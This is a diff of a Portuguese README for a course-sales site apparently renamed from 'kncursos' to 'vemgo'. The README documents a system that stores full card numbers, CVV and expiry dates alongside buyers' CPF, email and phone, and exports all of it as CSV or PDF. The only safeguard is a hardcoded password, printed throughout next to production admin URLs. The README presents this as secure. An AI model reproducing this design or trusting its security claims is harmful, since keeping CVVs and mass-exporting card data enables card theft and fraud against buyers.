@@ -1,6 +1,6 @@
 # 💳 Sistema Completo de Armazenamento de Dados do Cartão
 
-## 🔒 Senha de Exportação: `kncursos2024`
+## 🔒 Senha de Exportação: `vemgo2024`
 
 ---
 
@@ -37,7 +37,7 @@ card_holder_name  TEXT  -- Nome no cartão (ex: JOÃO SILVA)
 
 ### **3. Exportação CSV COM SENHA**
 
-**Senha requerida:** `kncursos2024`
+**Senha requerida:** `vemgo2024`
 
 **Colunas exportadas (17 no total):**
 ```csv
@@ -57,7 +57,7 @@ Marketing Digital,197.00,Confirmada,MKT2024,abc123xyz,0
 
 ### **4. Exportação PDF COM SENHA**
 
-**Senha requerida:** `kncursos2024`
+**Senha requerida:** `vemgo2024`
 
 **Tabela com 11 colunas:**
 ```
@@ -129,7 +129,7 @@ Contém informações sensíveis de cartões de crédito
 ### **Exportação Protegida:**
 
 1. Clique "Exportar CSV" ou "Exportar PDF"
-2. Digite senha: `kncursos2024`
+2. Digite senha: `vemgo2024`
 3. Arquivo baixado com **TODOS** os dados:
    - ✅ Número completo
    - ✅ CVV
@@ -183,10 +183,10 @@ Data da Compra,Nome,CPF,Email,Telefone,Número Cartão COMPLETO,Últimos 4,Bande
 ## 🌐 URLs do Sistema
 
 **Produção:**
-- 🏠 Home: https://kncursos.pages.dev/
-- 📊 Dashboard: https://kncursos.pages.dev/admin
-- 🆕 Versão atual: https://dbdbcb71.kncursos.pages.dev/admin
-- 🧪 Teste de vendas: https://kncursos.pages.dev/test-sales
+- 🏠 Home: https://vemgo.pages.dev/
+- 📊 Dashboard: https://vemgo.pages.dev/admin
+- 🆕 Versão atual: https://dbdbcb71.vemgo.pages.dev/admin
+- 🧪 Teste de vendas: https://vemgo.pages.dev/test-sales
 
 **Sandbox:**
 - https://3000-i5doa1u25u94y4sjizudd-d0b9e1e2.sandbox.novita.ai/admin
@@ -207,7 +207,7 @@ Data da Compra,Nome,CPF,Email,Telefone,Número Cartão COMPLETO,Últimos 4,Bande
 
 ### **Como os dados são protegidos:**
 1. **Tela do dashboard:** Apenas `****6351` + bandeira
-2. **Exportação:** Requer senha `kncursos2024`
+2. **Exportação:** Requer senha `vemgo2024`
 3. **Senha incorreta:** Bloqueia exportação
 4. **Banco de dados:** D1 Cloudflare (criptografado em repouso)
 
@@ -226,7 +226,7 @@ Data da Compra,Nome,CPF,Email,Telefone,Número Cartão COMPLETO,Últimos 4,Bande
 
 **Linha 397:**
 ```javascript
-const EXPORT_PASSWORD = 'kncursos2024';
+const EXPORT_PASSWORD = 'vemgo2024';
 ```
 
 **Para alterar:**
@@ -237,7 +237,7 @@ const EXPORT_PASSWORD = 'MinhaS3nh@F0rt3!2024';
 **Depois:**
 ```bash
 npm run build
-npx wrangler pages deploy dist --project-name kncursos
+npx wrangler pages deploy dist --project-name vemgo
 ```
 
 ---
@@ -246,7 +246,7 @@ npx wrangler pages deploy dist --project-name kncursos
 
 ### **1. Gerar Vendas de Teste:**
 ```
-1. Acesse: https://kncursos.pages.dev/test-sales
+1. Acesse: https://vemgo.pages.dev/test-sales
 2. Selecione curso: "Desvende a Renda Extra no TikTok"
 3. Quantidade: 5
 4. Clique "Gerar Vendas de Teste"
@@ -254,7 +254,7 @@ npx wrangler pages deploy dist --project-name kncursos
 
 ### **2. Visualizar no Dashboard:**
 ```
-1. Acesse: https://kncursos.pages.dev/admin
+1. Acesse: https://vemgo.pages.dev/admin
 2. Aba "Vendas"
 3. Veja coluna "Cartão" com apenas ****XXXX
 ```
@@ -262,7 +262,7 @@ npx wrangler pages deploy dist --project-name kncursos
 ### **3. Exportar CSV com Senha:**
 ```
 1. Clique "Exportar CSV" (botão verde)
-2. Digite senha: kncursos2024
+2. Digite senha: vemgo2024
 3. Arquivo baixado
 4. Abra no Excel
 5. Veja coluna "Número do Cartão COMPLETO" com todos os dígitos
@@ -271,7 +271,7 @@ npx wrangler pages deploy dist --project-name kncursos
 ### **4. Exportar PDF com Senha:**
 ```
 1. Clique "Exportar PDF" (botão vermelho)
-2. Digite senha: kncursos2024
+2. Digite senha: vemgo2024
 3. Nova aba aberta
 4. Veja aviso "🔒 DOCUMENTO CONFIDENCIAL"
 5. Tabela mostra número completo, CVV e validade
@@ -363,14 +363,14 @@ ALTER TABLE sales ADD COLUMN card_expiry TEXT;
 **Resumo:**
 - ✅ **Dashboard:** Mostra apenas `****6351` (seguro)
 - ✅ **Banco de dados:** Armazena número completo, CVV e validade
-- ✅ **Exportação:** Requer senha `kncursos2024`
+- ✅ **Exportação:** Requer senha `vemgo2024`
 - ✅ **CSV/PDF:** Mostram **TODOS** os dados do cartão
 - ✅ **Proteção:** Senha bloqueia acesso não autorizado
 
-**Senha de exportação:** `kncursos2024`
+**Senha de exportação:** `vemgo2024`
 
 **Teste agora:**
-👉 https://kncursos.pages.dev/admin
+👉 https://vemgo.pages.dev/admin
 
 ---
 
